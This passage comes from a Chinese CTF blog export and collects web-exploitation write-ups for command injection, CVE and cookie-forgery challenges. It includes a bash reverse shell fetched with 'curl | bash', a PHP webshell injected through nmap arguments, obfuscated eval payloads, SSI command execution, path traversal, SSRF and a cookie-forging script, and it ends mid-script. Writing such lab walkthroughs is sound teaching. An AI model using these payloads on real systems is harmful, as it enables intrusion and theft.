(preg_match(&#39;&#x2F;\&gt;|\\\&#x2F;&#39;, $girl)) &#123;        die(&#39;just girl&#39;);    &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$&#x2F;i&#39;, $girl)) &#123;        echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;    &#125; else &#123;        &#x2F;&#x2F;duangShell~~~~        exec($girl);    &#125;&#125;</code></pre><p>代码审计，可以POST一个<code>girl_friend</code>参数但过滤了一些参数，看到最后执行命令使用的是<code>exec</code>的函数，返回最后一行内容，无回显，由于看不到输出，就选择反弹shell来拿到系统权限执行命令。</p><p>正好<code>curl</code>命令没用被禁，<a href="https://www.cnblogs.com/yanguhung/p/10115911.html">curl命令参考</a>，于是选择用<code>curl</code>指令来curl远程主机上的文件然后再用管道符<code>| bash</code>来执行<code>curl</code>下来的内容</p><p>由于<code>buu</code>上面的靶机无法访问外网，创个小号开台可以用的靶机（靶机已经装好了LAMP），由于都是在一个内网，所以靶机之间可以互相访问</p><p><code>ssh</code>登录<code>ssh -p 29722 root@node3.buuoj.cn</code></p><p>输入密码进去后在<code>/var/www/html</code>目录下创建一个<code>txt</code>文件，里面写上反弹shell的语句</p><pre class="language-shell" data-language="shell"><code class="language-shell">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.143.177&#x2F;2333 0&gt;&amp;1</code></pre><p>注意上面的ip地址为内网的ip，提前用ifconfig查看一下内网ip就可以了，</p><p>然后在需要反弹shell的机子上post参数：</p><pre class="language-shell" data-language="shell"><code class="language-shell">girl_friend&#x3D;curl 174.1.143.177&#x2F;1.txt | bash</code></pre><p>可以看到shell被弹过来了，然后开始找flag</p><p>在根目录下有一个flag文件，但里面放的不是flag，于是find+grep查找</p><pre class="language-shell" data-language="shell"><code class="language-shell">find etc -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot;</code></pre><p><a href="https://www.runoob.com/linux/linux-comm-xargs.html">xargs</a>，最终在<code>etc</code>中找到了flag</p><p>关于反弹shell的解析参考以下文章</p><blockquote><p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a>   （Linux反弹shell（一）文件描述符与重定向）</p><p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a>   （Linux 反弹shell（二）反弹shell的本质）</p><p><a href="https://www.cnblogs.com/-zhong/p/11398877.html">https://www.cnblogs.com/-zhong/p/11398877.html</a>   （Liunx反弹shell的几种方式）</p></blockquote><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="BUUCTF-2018-Online Tool"></a>BUUCTF-2018-Online Tool</h3><p>首页源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpif (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;    $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];&#125;if(!isset($_GET[&#39;host&#39;])) &#123;    highlight_file(__FILE__);&#125; else &#123;    $host &#x3D; $_GET[&#39;host&#39;];    $host &#x3D; escapeshellarg($host);    $host &#x3D; escapeshellcmd($host);    $sandbox &#x3D; md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);    echo &#39;you are in sandbox &#39;.$sandbox;    @mkdir($sandbox);    chdir($sandbox);    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125;</code></pre><p>可以<code>get</code>一个<code>host</code></p><ul><li><strong>escapeshellarg</strong>：将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</li><li><strong>escapeshellcmd</strong>：对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义，反斜线（\）会在以下字符之前插入： <code>*</code> <code>&amp;</code> <code>#</code> <code>;</code> <code>|</code> <code>\</code> <code>*</code> <code>?</code> <code>~</code> <code>&lt;</code> <code>&gt;</code> <code>^</code> <code>(</code> <code>)</code> <code>[</code> <code>]</code> <code>&#123;</code> <code>&#125;</code> <code>$</code>  <code>*</code> <code>,</code> <code>\x0A</code> 和 <code>\xFF</code>。<code>&#39;</code>和<code>&quot;</code> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替。</li></ul><p>假设传入<code>172.17.0.2&#39; aaa</code>，结果<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; aaa&#39;</code>,在单引号前加了一个反斜杠转义，然后又将转义后单引号两边的字符串用引号引起来起到连接字符串的作用，随后经过<code>escapeshellcmd</code>处理变成了<code>&#39;172.17.0.2&#39;\\&#39;&#39; aaa&#39;</code>，<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，后面的<code>&#39;</code>配对成了一个空白连接符，如果是<code>ping</code>命令，则命令简化成了<code>ping 172.17.0.2\ aaa&#39;</code>，最终就会造成利用</p><p>于是我们配合<code>nmap</code>的<code>-oG</code>参数可以将扫描的结果生成指定的文件</p><p><code>payload</code>：<code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></p><h3 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="GKCTF2020-CheckIN"></a>GKCTF2020-CheckIN</h3><p>首先题目给出了源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;title&gt;Check_In&lt;&#x2F;title&gt;&lt;?php highlight_file(__FILE__);class ClassName&#123;        public $code &#x3D; null;        public $decode &#x3D; null;        function __construct()        &#123;                $this-&gt;code &#x3D; @$this-&gt;x()[&#39;Ginkgo&#39;];                $this-&gt;decode &#x3D; @base64_decode( $this-&gt;code );                @Eval($this-&gt;decode);        &#125;        public function x()        &#123;                return $_REQUEST;        &#125;&#125;new ClassName();</code></pre><p>可以看到已经相当于有一个马在上面了， <code>@Eval(base64_decode($_REQUEST[&#39;Ginkgo&#39;]));</code></p><p>于是直接用蚁剑连接：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525111558751.png" alt loading="lazy"></p><p>注意这里自带的base64解码好像用不了，在网上找一个可以用的，<a href="https://github.com/AntSwordProject/AwesomeEncoder/blob/master/php/encoder/b64pass.js">链接</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525111835994.png" alt loading="lazy"></p><p>添加到<code>AntSword</code>即可连接成功</p><p>虽然连上去了，也可以看到根目录下的flag，但是并没有权限直接读取flag，但是我们可以看到有一个readflag可执行文件，应该就是想办法利用这个文件来读取flag了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525113128509.png" alt loading="lazy"></p><p>然而我们并不能直接执行这个readflag文件，因为<strong>phpinfo</strong>中的<strong>disable_functions</strong>选项禁用了很多命令执行函数：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525113418596.png" alt loading="lazy"></p><p>于是有要想办法bypass  disable_functions来执行命令了，在网站找到可以直接执行命令的exp：</p><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p><p>直接传到网站的tmp目录下，我们具有tmp目录所有权限，令exp中<code>pwn(&quot;/readflag&quot;);</code>再发包<code>include(&#39;/tmp/exploits.php&#39;);</code>经过base64编码后的数据，即可读到flag</p><h3 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h3><p>要点-&gt;<strong>Apache SSI 远程命令执行漏洞</strong></p><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用<code>&lt;!--#exec cmd=”id” --&gt;</code>语法执行命令。</p><p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p><p>index.php.swp源码泄露，访问得到源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    ob_start();    function get_hash()&#123;        $chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;        $random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times        $content &#x3D; uniqid().$random;        return sha1($content);     &#125;    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);    ***    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )    &#123;        $admin &#x3D; &#39;6d0bc1&#39;;        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);            $text &#x3D; &#39;            ***            ***            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;            ***            ***&#39;;            fwrite($shtml,$text);            fclose($shtml);            ***            echo &quot;[!] Header  error ...&quot;;        &#125; else &#123;            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;    &#125;else    &#123;    ***    &#125;    ***?&gt;</code></pre><p>首先需要绕过<code>if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6))</code></p><p>写个简单的脚本</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpfor($i &#x3D; 0;$i &lt; 9999999; $i++)&#123;    if(substr(md5($i),0,6) &#x3D;&#x3D; &#39;6d0bc1&#39;)&#123;        print($i.&quot;\n&quot;);    &#125;&#125;</code></pre><p>得到一个<code>2020666</code>，拿去发包</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200808171429367.png" alt="image-20200808171429367" loading="lazy"></p><p>得到路径</p><p>于是利用<strong>Apache SSI 远程命令执行漏洞</strong></p><p>payload：<code>username=&lt;!--#exec cmd=&quot;cd ..;cat flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666</code></p><p>访问shtml文件即可得到flag</p><h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h3><p>首先题目给出了源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if (isset($_GET[&#39;code&#39;])) &#123;    $code &#x3D; $_GET[&#39;code&#39;];    if (strlen($code) &gt; 40) &#123;        die(&quot;This is too Long.&quot;);    &#125;    if (preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;, $code)) &#123;        die(&quot;NO.&quot;);    &#125;    @eval($code);&#125; else &#123;    highlight_file(__FILE__);&#125;</code></pre><p>可以看到可以命令执行，但是过滤了所有的字母和数字，并且限制了字符串发长度不能大于40</p><p>于是构造特殊字符来进行命令执行：</p><p>payload：</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">1、  异或方法$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])&#96;2、  取反方法(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9E%DD%A2%D6%D6);</code></pre><p>然后用蚁剑连接，注意这里是不能直接命令执行的，因为<code>disable_function</code>限制了很多的命令执行函数</p><p>用<code>phpinfo()</code>查看一下</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">(~%8F%97%8F%96%91%99%90)();</code></pre><pre class="language-none"><code class="language-none">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</code></pre><p>根目录下有<code>readflag</code> 和  <code>flag</code>文件，<code>flag</code>读取权限不够，<code>readflag</code>不能执行，需要绕过<code>disable_function</code>，利用蚁剑的插件绕过，执行后在蚁剑终端执行<code>/readflag</code>即可读到flag</p><h3 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h3><p>题目需要用json格式的数据进行命令执行，如：<code>&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</code></p><p>这题应该是比赛时题目给出了源码buu上没放，源码如下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpputenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;);if (isset($_REQUEST[&#39;cmd&#39;])) &#123;  $json &#x3D; $_REQUEST[&#39;cmd&#39;];  if (!is_string($json)) &#123;    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;  &#125; elseif (preg_match(&#39;&#x2F;^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\&#x2F;;-@\[-&#96;|~\x7F]+).*$&#x2F;&#39;, $json)) &#123;    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;  &#125; else &#123;    echo &#39;Attempting to run command:&lt;br&#x2F;&gt;&#39;;    $cmd &#x3D; json_decode($json, true)[&#39;cmd&#39;];    if ($cmd !&#x3D;&#x3D; NULL) &#123;      system($cmd);    &#125; else &#123;      echo &#39;Invalid input&#39;;    &#125;    echo &#39;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;  &#125;&#125;?&gt;</code></pre><p>过滤了很多东西</p><p><code>putenv(&#39;PATH=/home/rceservice/jail&#39;)</code>，限制了命令执行的环境，用全路径就可以了，问题是waf的绕过</p><p>我们知道php正则匹配在默认模式下认为目标字符串是由单行字符组成的，即不匹配多行，于是即可以用%0A绕过，最终payload如下：</p><pre class="language-none"><code class="language-none">&#123;%0a&quot;cmd&quot;:&quot;ls &#x2F;home&#x2F;rceservice&quot;%0a&#125;    &#x2F;&#x2F;flag jail&#123;%0a&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0a&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-CVE</title>
      <link href="/posts/67caa546/"/>
      <url>/posts/67caa546/</url>
      
        <content type="html"><![CDATA[<h3 id="CVE-2018-12613"><a href="#CVE-2018-12613" class="headerlink" title="CVE-2018-12613"></a>CVE-2018-12613</h3><p><strong>2019GWCTF—我有一个数据库</strong></p><p>核心—————–phpmyadmin[CVE-2018-12613]</p><p>利用dirb扫到phpmyadmin后台</p><p>利用该漏洞可进行任意文件读取</p><a id="more"></a><pre class="language-powershell" data-language="powershell"><code class="language-powershell">?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CVE/image-179.png" alt loading="lazy"></p><p>漏洞复现介绍与利用：</p><ul><li>首发：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd">ChaMd5安全团队</a></li><li>大专栏：<a href="https://www.dazhuanlan.com/2019/09/28/5d8ebdd8af9b2/">https://www.dazhuanlan.com/2019/09/28/5d8ebdd8af9b2/</a></li><li>Freebuf：<a href="https://www.freebuf.com/column/207707.html">https://www.freebuf.com/column/207707.html</a></li></ul><h3 id="CVE-2019-17221"><a href="#CVE-2019-17221" class="headerlink" title="CVE-2019-17221"></a>CVE-2019-17221</h3><p><strong>WEB_RemoteImageDownloader</strong></p><p>核心—————–PhantomJS任意文件读取[CVE-2019-17221]</p><p><a href="https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/">Breaching the perimeter – PhantomJs Arbitrary file read</a></p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E6%94%B6%E9%9B%86/image-20200506121650092.png" alt loading="lazy"></p><p>POC</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  x<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">;</span>  x<span class="token punctuation">.</span><span class="token function-variable function">onload</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  x<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"file:///flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  x<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>将html保存到自己的公网ip上，然后题目界面下载即可，最后得到flag的图片</p><h3 id="CVE-2020-7066"><a href="#CVE-2020-7066" class="headerlink" title="CVE-2020-7066"></a>CVE-2020-7066</h3><p>CVE介绍：</p><pre class="language-none"><code class="language-none">In PHP versions 7.2.x below 7.2.29, 7.3.x below 7.3.16 and 7.4.x below 7.4.4, while using get_headers() with user-supplied URL, if the URL contains zero (\0) character, the URL will be silently truncated at it. This may cause some software to make incorrect assumptions about the target of the get_headers() and possibly send some information to a wrong server.</code></pre><p>PHP 7.2.29之前的7.2.x版本、7.3.16之前的7.3.x版本和7.4.4之前的7.4.x版本中的<code>get_headers()</code>函数存在安全漏洞</p><p>将<code>get_headers()</code>与用户提供的URL一起使用时，如果URL包含零<code>(\0)</code>字符，则URL将被静默地截断。这可能会导致某些软件对<code>get_headers()</code>的目标做出错误的假设，并可能将某些信息发送到错误的服务器。</p><p><strong>[GKCTF2020]cve版签到</strong></p><p>点进去题目</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200625130103332.png" alt loading="lazy"></p><p>点击View CTFHub后Url请求一个get参数，<code>?url=http://www.ctfhub.com</code>，看着像SSRF，再结合题目提示这个CVE漏洞，还有在请求返回头里有一个<code>Hint：Flag in localhost</code></p><p>于是请求：<code>?url=http://localhost%00.ctfhub.com</code>得到如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200625130420379.png" alt loading="lazy"></p><p>于是请求<code>?url=http://127.0.0.123%00.ctfhub.com</code>，得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-其它</title>
      <link href="/posts/5d485480/"/>
      <url>/posts/5d485480/</url>
      
        <content type="html"><![CDATA[<h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><h2 id="百度杯九月场Code"><a href="#百度杯九月场Code" class="headerlink" title="百度杯九月场Code"></a>百度杯九月场Code</h2><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219214921326.png" alt loading="lazy"></p><p>url：<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=hei.jpg</code>，查看源码：</p><a id="more"></a><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219215138731.png" alt loading="lazy"></p><p>猜测存在文件包含读取文件操作，于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=index.php</code>查看源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219215307566.png" alt loading="lazy"></p><p>base64解密后得到index.php的源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;** * Created by PhpStorm. * Date: 2015&#x2F;11&#x2F;16 * Time: 1:31 *&#x2F;header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);if(! isset($_GET[&#39;jpg&#39;]))    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?jpg&#x3D;hei.jpg&#39;);$file &#x3D; $_GET[&#39;jpg&#39;];echo &#39;&lt;title&gt;file:&#39;.$file.&#39;&lt;&#x2F;title&gt;&#39;;$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;,&quot;&quot;, $file);$file &#x3D; str_replace(&quot;config&quot;,&quot;_&quot;, $file);$txt &#x3D; base64_encode(file_get_contents($file));echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot;.$txt.&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;&#x2F;* * Can you find the flag file? * *&#x2F;?&gt;</code></pre><p>注意注释里的这话句<code>Created by PhpStorm</code>，是用<code>PhpStorm</code>编辑器写的，用这个编辑器写的工程文件下会有一个<code>.idea</code>文件夹，<a href="https://segmentfault.com/q/1010000008644646">详</a>，类似于这个项目的根目录文件，里面包含了一些xml文件（配置）。</p><p>于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/.idea/workspace.xml</code>得到一个xml页面，提取其中有用信息</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219220208401.png" alt loading="lazy"></p><p>结合<code>index.php</code>的源码利用<code>config</code>代替<code>_</code>，于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=fl3gconfigichuqiu.php</code>得到<code>fl3g_ichuqiu.php</code>的源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;** * Created by PhpStorm. * Date: 2015&#x2F;11&#x2F;16 * Time: 1:31 *&#x2F;error_reporting(E_ALL || ~E_NOTICE);include(&#39;config.php&#39;);function random($length, $chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;) &#123;    $hash &#x3D; &#39;&#39;;    $max &#x3D; strlen($chars) - 1;    for($i &#x3D; 0; $i &lt; $length; $i++)    &#123;        $hash .&#x3D; $chars[mt_rand(0, $max)];    &#125;    return $hash;&#125;function encrypt($txt,$key)&#123;    for($i&#x3D;0;$i&lt;strlen($txt);$i++)&#123;        $tmp .&#x3D; chr(ord($txt[$i])+10);    &#125;    $txt &#x3D; $tmp;    $rnd&#x3D;random(4);    $key&#x3D;md5($rnd.$key);    $s&#x3D;0;    for($i&#x3D;0;$i&lt;strlen($txt);$i++)&#123;        if($s &#x3D;&#x3D; 32) $s &#x3D; 0;        $ttmp .&#x3D; $txt[$i] ^ $key[++$s];    &#125;    return base64_encode($rnd.$ttmp);&#125;function decrypt($txt,$key)&#123;    $txt&#x3D;base64_decode($txt);    $rnd &#x3D; substr($txt,0,4);    $txt &#x3D; substr($txt,4);    $key&#x3D;md5($rnd.$key);    $s&#x3D;0;    for($i&#x3D;0;$i&lt;strlen($txt);$i++)&#123;        if($s &#x3D;&#x3D; 32) $s &#x3D; 0;        $tmp .&#x3D; $txt[$i]^$key[++$s];    &#125;    for($i&#x3D;0;$i&lt;strlen($tmp);$i++)&#123;        $tmp1 .&#x3D; chr(ord($tmp[$i])-10);    &#125;    return $tmp1;&#125;$username &#x3D; decrypt($_COOKIE[&#39;user&#39;],$key);if ($username &#x3D;&#x3D; &#39;system&#39;)&#123;    echo $flag;&#125;else&#123;    setcookie(&#39;user&#39;,encrypt(&#39;guest&#39;,$key));    echo &quot;╮(╯▽╰)╭&quot;;&#125;?&gt;</code></pre><p>发现分别有一个加密函数，一个解密函数，分析php代码；</p><p>当传入<code>cookie</code>中的<code>user</code>的值经过<code>decrypt</code>函数后返回的值为<code>system</code>，就可以得到flag，所以我们需要得到一串base64码，这一串base64经过<code>decrypt</code>函数能解出<code>system</code>，于是</p><p>由<code>guest</code>可以逆推出<code>rnd</code>的值和md5加密后<code>key</code>值的前5位；</p><p>再由<code>key</code>的前5位得出所有前6位可能的值，再通过<code>decrypt</code>函数逆推出函数中<code>$txt</code>值的后6位，再在前面加上<code>$rnd</code>的值经过base64加密后得到的16个可能的<code>user</code>值，再拿16个值去bp进行爆破，即可得到flag</p><p>写出解密脚本，得到<code>rnd</code>和md5加密后的<code>key</code>值</p><pre class="language-python" data-language="python"><code class="language-python">import base64session &#x3D; &#39;OFZhSEdLVxga&#39;#本地user值txt &#x3D; base64.b64decode(session.encode()).decode()rnd &#x3D; txt[0:4]   #拿到rnd的值ttemp &#x3D; txt[4:]guest &#x3D; &#39;guest&#39;tmp &#x3D; &#39;&#39;for i in range(len(guest)):    tmp +&#x3D; chr(ord(guest[i]) + 10)key &#x3D; &#39;&#39;for i in range(len(ttemp)):    key +&#x3D; chr(ord(tmp[i]) ^ ord(ttemp[i]))#拿到keysystem &#x3D; &#39;system&#39;system1 &#x3D; &#39;&#39;for i in range(len(system)):    system1 +&#x3D; chr(ord(system[i]) + 10)md5 &#x3D; &#39;0123456789abcdef&#39;#经过md5加密后的每一位数都是0-f之间的数key_new &#x3D; &#39;&#39;cookie_new &#x3D; &#39;&#39;for i in range(len(md5)): #循环出所有可能的结果    key_new  &#x3D; key + md5[i]    session_new &#x3D; &#39;&#39;    for j in range(len(system1)):        session_new +&#x3D; chr(ord(key_new[j]) ^ ord(system1[j]))    session_new &#x3D; rnd + session_new    cookie_new &#x3D; base64.b64encode(session_new.encode()).decode()    